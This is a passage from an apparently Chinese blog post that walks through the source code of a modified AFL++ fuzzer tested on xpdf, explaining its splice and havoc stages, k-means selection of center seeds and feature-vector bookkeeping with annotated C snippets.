遍历当前队列项</span><br>      <span class="hljs-keyword">for</span>(u32 i = <span class="hljs-number">0</span>;i &lt; q-&gt;len;i++)&#123;<br>          <span class="hljs-comment">// 初始化每一个字节</span><br>        q-&gt;mutated_pos[i].SV = <span class="hljs-number">0</span>;<br>        q-&gt;mutated_pos[i].add = <span class="hljs-number">0</span>;<br><br>        q-&gt;mutated_pos[i].flag = <span class="hljs-number">0</span>;<br>        q-&gt;mutated_pos[i].A = <span class="hljs-literal">NULL</span>;<br>        q-&gt;mutated_pos[i].b = <span class="hljs-literal">NULL</span>;<br>      &#125;<br>        <span class="hljs-comment">// 重置变异字节数量</span><br>      q-&gt;mutated_pos_num = <span class="hljs-number">0</span>;<br>    &#125;<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; &#125;<br></code></pre></td></tr></table></figure><p>aflpp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (q-&gt;len &lt; <span class="hljs-number">5</span>) &#123;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; &#125;<br></code></pre></td></tr></table></figure><p>以xpdf为目标测试，修剪中目标程序执行了0x7F8次</p><h3 id="变量详解"><a href="#变量详解" class="headerlink" title="变量详解"></a>变量详解</h3><p>初始化后，正式执行中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//除却前面给变量分配看空间，并初始化0外，以下为xpdf测试期间，w模式开启下的变量修改位置与意义。</span><br><span class="hljs-comment">// afl-fuzz-one.c 4137行，函数fuzz_one_original()内</span><br>afl-&gt;write_flag = <span class="hljs-number">1</span>;<br><span class="hljs-comment">// afl-fuzz-one.c 4141行，函数fuzz_one_original()内</span><br><span class="hljs-keyword">if</span>(cur_time &gt; <span class="hljs-number">1200</span>) afl-&gt;time_to_use_length_mutator = <span class="hljs-number">1</span>; <span class="hljs-comment">// 本次执行，变为1，因为cur_time=1331</span><br><span class="hljs-keyword">else</span> afl-&gt;time_to_use_length_mutator = <span class="hljs-number">0</span>;  <br><span class="hljs-comment">// afl-&gt;fuzz-one.c 4279行，函数fuzz_one_original()内</span><br>afl-&gt;use_splice_mutator = <span class="hljs-number">0</span>;<br><span class="hljs-comment">// 当一个种子的变异次数r在splice变异器区间的话，以下变量用于存储变异</span><br><span class="hljs-comment">// afl-&gt;fuzz-one.c 函数fuzz_one_original()内</span><br><span class="hljs-keyword">if</span>(afl-&gt;splice_num &lt; <span class="hljs-number">512</span>)&#123;<br>    afl-&gt;splice_stack[afl-&gt;splice_num][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;        <span class="hljs-comment">// splice变异标志位</span><br>    afl-&gt;splice_stack[afl-&gt;splice_num][<span class="hljs-number">1</span>] = clone_to; <span class="hljs-comment">// 变异起始位置</span><br>    afl-&gt;splice_stack[afl-&gt;splice_num][<span class="hljs-number">2</span>] = clone_len;<span class="hljs-comment">// 变异长度</span><br>    afl-&gt;splice_num++;  <span class="hljs-comment">// splice变异次数</span><br>&#125;<br><br><span class="hljs-comment">// afl-&gt;fuzz-one.c 418行，函数stat_analysis()内</span><br>afl-&gt;read_flag = <span class="hljs-number">1</span>;<br>afl-&gt;mini_mode = <span class="hljs-number">1</span>;<br><br><span class="hljs-comment">// 对每个必要字节:</span><br>u32 ii = (afl-&gt;queue_cur-&gt;<span class="hljs-built_in">map</span>)[i];<br><span class="hljs-comment">// 这里的afl-&gt;queue_cur-&gt;ancestor_seed代表着一个family，也指向某个初始种子。</span><br><span class="hljs-keyword">if</span>(afl-&gt;queue_cur-&gt;ancestor_seed-&gt;mutated_pos[ii].flag &lt; <span class="hljs-number">1</span>)&#123;<br>    afl-&gt;queue_cur-&gt;ancestor_seed-&gt;mutated_pos[ii].flag += <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span>(afl-&gt;queue_cur-&gt;ancestor_seed-&gt;mutated_pos[ii].flag &gt;= <span class="hljs-number">1</span>)&#123;<br>        afl-&gt;queue_cur-&gt;ancestor_seed-&gt;mutated_pos[ii].A = M_I(afl-&gt;centers_num);<br>        afl-&gt;queue_cur-&gt;ancestor_seed-&gt;mutated_pos[ii].b = M_Zeros(afl-&gt;centers_num,<span class="hljs-number">1</span>);<br>        afl-&gt;queue_cur-&gt;ancestor_seed-&gt;mutated_pos_num++;<br>    &#125;<br>&#125;<br>afl-&gt;queue_cur-&gt;ancestor_seed-&gt;mutated_pos[ii].add = <span class="hljs-number">1</span>;<br><br><span class="hljs-comment">// 在控制生成的测试实例数量每次循环后，会将对应变异模式所执行的数量+1</span><br><span class="hljs-keyword">if</span>(random_mode)&#123;<span class="hljs-comment">// random_mode，后续还有两个模式，就不一一列举。</span><br>    afl-&gt;queue_cur-&gt;found_by_random++;<br>    afl-&gt;found_by_random_all++;<br>&#125;<br></code></pre></td></tr></table></figure><p>以上是第一次执行变异的过程所修改的变量，其中有大量路径没有执行，因为初始种子数量不够，无法生成中心种子。因此第一次执行是采取random_mode。接下来是第一次变异执行后的收尾：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">afl-&gt;write_flag = <span class="hljs-number">0</span>;<span class="hljs-comment">// 写标志置0</span><br>new_hit_cnt = afl-&gt;queued_items + afl-&gt;saved_crashes;<br><span class="hljs-keyword">if</span> (!splice_cycle) &#123;<span class="hljs-comment">// 当前不处于splice_cycle</span><br>    <span class="hljs-comment">// 用数组记录当前是哪个阶段，以及当前阶段所保存下来的测试实例数量，执行的测试实例数量。</span><br>    afl-&gt;stage_finds[STAGE_HAVOC] += new_hit_cnt - orig_hit_cnt;<br>  afl-&gt;stage_cycles[STAGE_HAVOC] += afl-&gt;stage_max;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>接下来进入retry_splicing阶段</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">retry_splicing:<br><span class="hljs-comment">// 根据fuzzing的执行时间，与队列周期决定要不要使用splice变异器</span><br>  <span class="hljs-keyword">if</span>(((afl-&gt;prev_run_time + get_cur_time() - afl-&gt;start_time) / <span class="hljs-number">1000</span>) &gt; <span class="hljs-number">1200</span> &amp;&amp; afl-&gt;queue_cycle &lt;= <span class="hljs-number">1</span>)&#123;<br>    u32 tmp = rand_below(afl, <span class="hljs-number">4</span>);<br>    <span class="hljs-keyword">if</span>(tmp == <span class="hljs-number">1</span>)&#123;<br>      afl-&gt;use_splicing = <span class="hljs-number">1</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>      afl-&gt;use_splicing = <span class="hljs-number">0</span>;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p><strong>splice阶段</strong>，将种子池中的某个种子，进行拼接变异后，存入<code>afl-&gt;in</code>中，并跳转到<code>havoc_stage</code>对这个种子进行随机变异。</p><p><strong>进入splice_cycle中的havoc阶段</strong>，同样的havoc流程。本次执行了两次splicing_havoc。由一个随机值控制splicing_havoc的次数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-keyword">if</span>(((afl-&gt;prev_run_time + get_cur_time() - afl-&gt;start_time) / <span class="hljs-number">1000</span>) &gt; <span class="hljs-number">1200</span> &amp;&amp; afl-&gt;queue_cycle &lt;= <span class="hljs-number">1</span>)&#123;<br>    u32 tmp = rand_below(afl, <span class="hljs-number">4</span>);<br>    <span class="hljs-keyword">if</span>(tmp == <span class="hljs-number">1</span>)&#123;<br>      afl-&gt;use_splicing = <span class="hljs-number">1</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>      afl-&gt;use_splicing = <span class="hljs-number">0</span>;<br>    &#125;<br>  &#125;<br><span class="hljs-comment">// 在queue_cycle&gt;1后的周期内，都会置splice为1</span><br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(afl-&gt;queue_cycle &gt; <span class="hljs-number">1</span>)&#123;<br>    afl-&gt;use_splicing = <span class="hljs-number">1</span>;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    afl-&gt;use_splicing = <span class="hljs-number">0</span>;<br>  &#125;<br><span class="hljs-comment">// 随后还有一个判断，slice_cycle要小于15，也就是不会连续splice_havoc变异超过15次。</span><br>  <span class="hljs-keyword">if</span> (afl-&gt;use_splicing &amp;&amp; splice_cycle++ &lt; SPLICE_CYCLES &amp;&amp;<br>      afl-&gt;ready_for_splicing_count &gt; <span class="hljs-number">1</span> &amp;&amp; afl-&gt;queue_cur-&gt;len &gt;= <span class="hljs-number">4</span>)<br></code></pre></td></tr></table></figure><p><strong>然后进入abandon_entry阶段：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">abandon_entry:<br>  afl-&gt;splicing_with = <span class="hljs-number">-1</span>;<br>  <span class="hljs-keyword">if</span> (!afl-&gt;stop_soon &amp;&amp; !afl-&gt;queue_cur-&gt;cal_failed &amp;&amp;<br>      !afl-&gt;queue_cur-&gt;was_fuzzed &amp;&amp; !afl-&gt;queue_cur-&gt;disabled) &#123;<br><br>    --afl-&gt;pending_not_fuzzed;<span class="hljs-comment">// Queued but not done yet </span><br>    afl-&gt;queue_cur-&gt;was_fuzzed = <span class="hljs-number">1</span>;         <span class="hljs-comment">// historical, but needed for MOpt</span><br>    afl-&gt;reinit_table = <span class="hljs-number">1</span>;<span class="hljs-comment">// reinit the queue weight table</span><br>    <span class="hljs-keyword">if</span> (afl-&gt;queue_cur-&gt;favored) &#123; --afl-&gt;pending_favored; &#125;<span class="hljs-comment">//Pending favored paths</span><br><br>  &#125;<br>++afl-&gt;queue_cur-&gt;fuzz_level;<span class="hljs-comment">// Number of fuzzing iterations</span><br></code></pre></td></tr></table></figure><p><strong>重新一次循环阶段：</strong></p><p>在trimming之后，这一次会执行kmeans_main(afl)。</p><p><strong>kmeans_main(afl)</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 首先会调用update_feature_map(afl)</span><br>update_feature_map(afl);<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">update_feature_map</span><span class="hljs-params">(<span class="hljs-type">afl_state_t</span> *afl)</span>&#123;<br>  u32 *ptr = (u32 *)afl-&gt;virgin_bits;<span class="hljs-comment">// afl-&gt;virgin_bits记录着未被fuzzing区域</span><br>  u32  i = ((afl-&gt;fsrv.real_map_size + <span class="hljs-number">3</span>) &gt;&gt; <span class="hljs-number">2</span>);<br>  u32  ret = <span class="hljs-number">0</span>;<br>  u32 id = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">memset</span>(afl-&gt;feature_map, <span class="hljs-number">0</span>, afl-&gt;fsrv.map_size * <span class="hljs-keyword">sizeof</span>(u32));<br>  afl-&gt;num_edge = <span class="hljs-number">1</span>;<br>  <span class="hljs-comment">// 对于afl-&gt;virgin_bits中的每4个字节为单位进行判断</span><br>  <span class="hljs-keyword">while</span> (i--) &#123;<br>    u32 v = *(ptr++);<br><br>    <span class="hljs-keyword">if</span> (likely(v == <span class="hljs-number">0xffffffffU</span>)) &#123;<br>      id +=<span class="hljs-number">4</span>;<br>      <span class="hljs-keyword">continue</span>; <br>    &#125;<br>    <span class="hljs-keyword">if</span> ((v &amp; <span class="hljs-number">0x000000ffU</span>) != <span class="hljs-number">0x000000ffU</span>) &#123;<span class="hljs-comment">// 最低字节不等于ff</span><br>      afl-&gt;feature_map[id + <span class="hljs-number">0</span>] = afl-&gt;num_edge;<br>      afl-&gt;num_edge++;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((v &amp; <span class="hljs-number">0x0000ff00U</span>) != <span class="hljs-number">0x0000ff00U</span>) &#123;<span class="hljs-comment">// 次低字节不等于ff</span><br>      afl-&gt;feature_map[id + <span class="hljs-number">1</span>] = afl-&gt;num_edge;<br>      afl-&gt;num_edge++;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((v &amp; <span class="hljs-number">0x00ff0000U</span>) != <span class="hljs-number">0x00ff0000U</span>) &#123;<span class="hljs-comment">// 次高字节不等于ff</span><br>      afl-&gt;feature_map[id + <span class="hljs-number">2</span>] = afl-&gt;num_edge;<br>      afl-&gt;num_edge++;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((v &amp; <span class="hljs-number">0xff000000U</span>) != <span class="hljs-number">0xff000000U</span>) &#123;<span class="hljs-comment">// 最高字节不等于ff</span><br>      afl-&gt;feature_map[id + <span class="hljs-number">3</span>] = afl-&gt;num_edge;<br>      afl-&gt;num_edge++;<br>    &#125;<br><br>    id +=<span class="hljs-number">4</span>;<br>  &#125;<br><span class="hljs-comment">// 也就是说afl-&gt;num_edge记录着未被覆盖区域的每个不等于ff字节(或许是有效字节)的数量</span><br><span class="hljs-comment">// 并且afl-&gt;feature_map存储着，这个字节是第几个不等于ff的字节。</span><br>&#125; <span class="hljs-comment">// 本次执行后，afl-&gt;num_edge = 2061</span><br></code></pre></td></tr></table></figure><p>对feature_map进行更新后，除却一些初始化的操作以外。进入循环中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 这是内层循环，外层循环是循环1次，貌似永远执行一次，还不知循环的目的。内存循环遍历种子池队列queue_items</span><br><span class="hljs-keyword">for</span> (u32 i = <span class="hljs-number">0</span>; i &lt; observations_size; i++) &#123;<br>      u32 tid;<br>      tid = rand_below(afl, afl-&gt;queued_items);<span class="hljs-comment">// 首先获得一个[0,queue_items-1]区间的随机数</span><br>      <span class="hljs-keyword">if</span> (likely(!afl-&gt;queue_buf[tid]-&gt;disabled)) &#123; <span class="hljs-comment">// 判断这个种子是否被设置禁用</span><br>        u8* out_buf = queue_testcase_get(afl, afl-&gt;queue_buf[tid]);  <span class="hljs-comment">// 获得这个种子的数据存入out_buf</span><br>        u32 len = afl-&gt;queue_buf[tid]-&gt;len;<br>        common_fuzz_stuff(afl, out_buf, len);<span class="hljs-comment">// 以out_buf为输入，执行目标程序</span><br><br>        u32 j = <span class="hljs-number">0</span>;<br>        u8 *src = afl-&gt;fsrv.trace_bits;<span class="hljs-comment">// 存着反馈信息，也就是更新后的位图</span><br>        <span class="hljs-keyword">while</span> (j &lt; map_size) &#123;<br>          u8 v = *src;<span class="hljs-comment">// 遍历位图</span><br>          <span class="hljs-keyword">if</span>(v)&#123;<span class="hljs-comment">// 对于覆盖的边</span><br>            u32 idx = afl-&gt;feature_map[j];<span class="hljs-comment">// 未被探索的第几条边或者已经被探索则为0</span><br>            observations[i][idx] = (<span class="hljs-type">float</span>)v;<span class="hljs-comment">// idx是未被探索的边的id</span><br>          &#125;<span class="hljs-comment">// v是已经被探索的边的id</span><br>          src++;<span class="hljs-comment">// 因此，observations记录着本次发现的新边在原未被探索边中的id，即记录哪些未被覆盖的边，经过这次执行，被覆盖了。</span><br>          ++j;<br>        &#125;<br>      &#125;<br>    &#125;<br>centers = km_new(observations, k, observations_size, vector_size); <span class="hljs-comment">// 调用km_new（开源库函数），得出中心节点</span><br></code></pre></td></tr></table></figure><p>算出中心节点后：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; k;i++)&#123;<br>  <span class="hljs-keyword">if</span>(afl-&gt;centers[i]) <span class="hljs-built_in">free</span>(afl-&gt;centers[i]);<span class="hljs-comment">// 如果这个中心节点为空的话，free掉空间。</span><br><br>  <span class="hljs-type">float</span>* tmp = (<span class="hljs-type">float</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">float</span>) * map_size); <br>  <span class="hljs-built_in">memset</span>(tmp, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">float</span>) * map_size);<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;j &lt; map_size;j++)&#123;<span class="hljs-comment">// 遍历向量图，也就是位图那么大</span><br>    u32 idx = afl-&gt;feature_map[j];<span class="hljs-comment">// 未探索边的id</span><br>    <span class="hljs-keyword">if</span>(centers[i][idx] != <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">// </span><br>      tmp[j] = centers[i][idx];<span class="hljs-comment">// </span><br>    &#125; <br>  &#125;<br>  afl-&gt;centers[i] = tmp;<span class="hljs-comment">// afl-&gt;centers保存的是中心种子的路径</span><br>&#125;<br></code></pre></td></tr></table></figure><p>随后释放observations的空间即退出<code>kmeans_main()</code>函数。</p><p>回到修剪后：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(afl-&gt;queued_items &gt; afl-&gt;centers_num &amp;&amp; (afl-&gt;queued_items &gt;= <span class="hljs-number">2</span> * afl-&gt;last_centers_realted_seeds))&#123;<br>  kmeans_main(afl);<span class="hljs-comment">// 从这儿执行结束后，中心种子已经选取结束。</span><br><br>  afl-&gt;last_centers_realted_seeds = afl-&gt;queued_items;<span class="hljs-comment">// 这个变量就记录着上一次计算中心种子用到的种子数量</span><br>  afl-&gt;centers_gen_time = fuzz_time;<span class="hljs-comment">// 中心种子生成所消耗的时间</span><br><br>  <span class="hljs-keyword">for</span> (u32 c = <span class="hljs-number">0</span>; c &lt; afl-&gt;queued_items; c++) &#123;<span class="hljs-comment">// 遍历种子池</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue_entry</span> * <span class="hljs-title">cur_node</span> =</span> afl-&gt;queue_buf[c];<span class="hljs-comment">// </span><br>    <span class="hljs-keyword">if</span>(cur_node-&gt;initial_seed &amp;&amp; cur_node-&gt;mutated_pos_num != <span class="hljs-number">-1</span>)&#123; <span class="hljs-comment">//重置初始种子</span><br>      <span class="hljs-keyword">for</span>(u32 i = <span class="hljs-number">0</span>;i &lt; cur_node-&gt;len;i++)&#123;<span class="hljs-comment">// 遍历每个字节位置，重新初始化一些变量。</span><br>        <span class="hljs-keyword">if</span>(cur_node-&gt;mutated_pos[i].flag &gt;= <span class="hljs-number">1</span>)&#123;<br>          M_free(cur_node-&gt;mutated_pos[i].A);<br>          M_free(cur_node-&gt;mutated_pos[i].b);<br><br>          cur_node-&gt;mutated_pos[i].A = M_I(afl-&gt;centers_num);<br>          cur_node-&gt;mutated_pos[i].b = M_Zeros(afl-&gt;centers_num,<span class="hljs-number">1</span>);<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>紧接着是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(afl-&gt;centers_gen_time &gt; afl-&gt;queue_cur-&gt;vec_update_time)&#123;<span class="hljs-comment">// 如果中心生成时间大于向量更新时间</span><br>  u32 map_size = afl-&gt;fsrv.map_size;<br>  <span class="hljs-type">float</span>* cur = (<span class="hljs-type">float</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">float</span>) * map_size);<br>  <span class="hljs-built_in">memset</span>(cur, <span class="hljs-number">0</span> ,<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">float</span>) * map_size);<br><br>  common_fuzz_stuff(afl, out_buf, len);<span class="hljs-comment">// 以in_buf(out_buf与in_buf相等)执行目标程序</span><br>  u32 j = <span class="hljs-number">0</span>;<br>  u8 *src = afl-&gt;fsrv.trace_bits;<br>  <span class="hljs-keyword">while</span> (j &lt; map_size) &#123;<br>    u8 v = *src;<br>    <span class="hljs-keyword">if</span>(v)&#123;<br>      cur[j] = (<span class="hljs-type">float</span>)v;<span class="hljs-comment">// cur记录着已经覆盖的边</span><br>    &#125;<br>    src++;<br>    ++j;<br>  &#125;<br><br>  <span class="hljs-keyword">for</span>(u32 i = <span class="hljs-number">0</span>;i &lt; afl-&gt;centers_num;i++)&#123;<span class="hljs-comment">// 遍历每个中心种子</span><br>    <span class="hljs-type">double</span> distance = (<span class="hljs-type">double</span>)cal_distance(cur, afl-&gt;centers[i], map_size);<span class="hljs-comment">// 计算当前种子路径与中心种子路径的余弦相似度</span><br>    afl-&gt;queue_cur-&gt;feature_vec-&gt;data[i] = distance;<span class="hljs-comment">// 特征向量feature_vec-&gt;data记录着余弦相似度</span><br>  &#125;<br><br>  afl-&gt;queue_cur-&gt;vec_update_time = afl-&gt;centers_gen_time;<span class="hljs-comment">// 最后更新一下向量更新时间与中心种子生成时间一致</span><br>  <br>&#125;<br></code></pre></td></tr></table></figure><p>最后一个收尾工作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(afl-&gt;queue_cur-&gt;len &gt; afl-&gt;max_len)&#123;<br>  <span class="hljs-keyword">if</span>(afl-&gt;history_mutation_sequence)&#123;<br>    <span class="hljs-built_in">free</span>(afl-&gt;history_mutation_sequence);<br>    <span class="hljs-built_in">free</span>(afl-&gt;new_mutation_sequence);<br>  &#125;<br><br>  afl-&gt;history_mutation_sequence = (u32 *)<span class="hljs-built_in">calloc</span>(afl-&gt;queue_cur-&gt;len, <span class="hljs-keyword">sizeof</span>(u32));<br>  afl-&gt;new_mutation_sequence = (u32 *)<span class="hljs-built_in">calloc</span>(afl-&gt;queue_cur-&gt;len, <span class="hljs-keyword">sizeof</span>(u32));<br><br>  <span class="hljs-keyword">if</span>(afl-&gt;max_len != <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-built_in">free</span>(afl-&gt;dataset_reward);<br>    <span class="hljs-built_in">free</span>(afl-&gt;hit_nums);<br>    <span class="hljs-built_in">free</span>(afl-&gt;tmp_mutated_pos);<br>    <span class="hljs-built_in">free</span>(afl-&gt;tmp_mutated_pos_flag);<br>  &#125;<br>  <br><br>  afl-&gt;dataset_reward = (<span class="hljs-type">double</span> *)<span class="hljs-built_in">calloc</span>(afl-&gt;queue_cur-&gt;len, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">double</span>));<br>  afl-&gt;hit_nums = (<span class="hljs-type">double</span> *)<span class="hljs-built_in">calloc</span>(afl-&gt;queue_cur-&gt;len, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">double</span>));<br>  afl-&gt;tmp_mutated_pos = (u32 *)<span class="hljs-built_in">calloc</span>(afl-&gt;queue_cur-&gt;len, <span class="hljs-keyword">sizeof</span>(u32));<br>  afl-&gt;tmp_mutated_pos_flag = (u8 *)<span class="hljs-built_in">calloc</span>(afl-&gt;queue_cur-&gt;len, <span class="hljs-keyword">sizeof</span>(u8));<br><br>  afl-&gt;max_len = afl-&gt;queue_cur-&gt;len;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-built_in">memset</span>(afl-&gt;dataset_reward, <span class="hljs-number">0</span>, afl-&gt;max_len * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">double</span>));<br>  <span class="hljs-built_in">memset</span>(afl-&gt;hit_nums, <span class="hljs-number">0</span>, afl-&gt;max_len * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">double</span>));<br>  <span class="hljs-built_in">memset</span>(afl-&gt;tmp_mutated_pos_flag, <span class="hljs-number">0</span>, afl-&gt;max_len * <span class="hljs-keyword">sizeof</span>(u8));<br>&#125;<br>afl-&gt;history_mutation_sequence_idx = <span class="hljs-number">0</span>;<br>afl-&gt;new_mutation_sequence_idx = <span class="hljs-number">0</span>;<br>afl-&gt;tmp_mutated_pos_idx = <span class="hljs-number">0</span>;<br>afl-&gt;from_splicing = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>收尾结束后，进入测试实例生成的循环中，会执行以下新代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span 